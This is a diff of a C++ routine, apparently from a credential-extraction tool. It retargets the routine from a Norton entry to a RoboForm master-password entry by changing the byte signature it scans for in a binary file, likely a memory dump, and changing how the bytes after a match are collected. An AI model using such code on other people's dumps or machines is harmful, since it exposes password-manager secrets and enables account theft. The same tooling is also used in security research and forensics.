@@ -3,10 +3,9 @@
 #include <fstream>
 #include <vector>
 #include <string>
-#include "../core/saveFile.h"
+#include "../../core/saveFile.h"
 
-//For master password and in case we cannot open the plugin
-int getCredsnorton2(std::string filename) {
+int getCredsroboformpluginMaster(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -14,7 +13,7 @@ int getCredsnorton2(std::string filename) {
         return 1;
     }
 
-    std::vector<unsigned char> searchPattern = { 0x80, 0x00, 0x04, 0x4c, 0x07, 0x10, 0xa0, 0x80, 0x02, 0x08, 0x00, 0x00, 0x00, 0x00, 0x5d, 0x08, 0x00, 0x00, 0x72, 0xfc, 0x29, 0x45, 0x10, 0x00, 0x00, 0x00 };
+    std::vector<unsigned char> searchPattern = { 0x00, 0x0d, 0x01, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00 };
     std::vector<unsigned char> foundData;
 
     while (!file.eof()) {
@@ -24,14 +23,22 @@ int getCredsnorton2(std::string filename) {
         if (c == searchPattern[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect data until reaching the 300 data limit
+                // We found the search pattern, now collect data until having two binary spaces (00)
                 std::vector<unsigned char> extractedData;
-                int dataCount = 0;
+                int consecutiveSpaces = 0;
 
-                while (dataCount < 300 && !file.eof()) {
+                while (!file.eof()) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
+                    if (c == 0x00) {
+                        consecutiveSpaces++;
+                        if (consecutiveSpaces == 2) {
+                            break; // (00) found
+                        }
+                    }
+                    else {
+                        consecutiveSpaces = 0;
+                    }
                     extractedData.push_back(c);
-                    dataCount++;
                 }
 
                 // Convert the binary data to a UTF-8 string
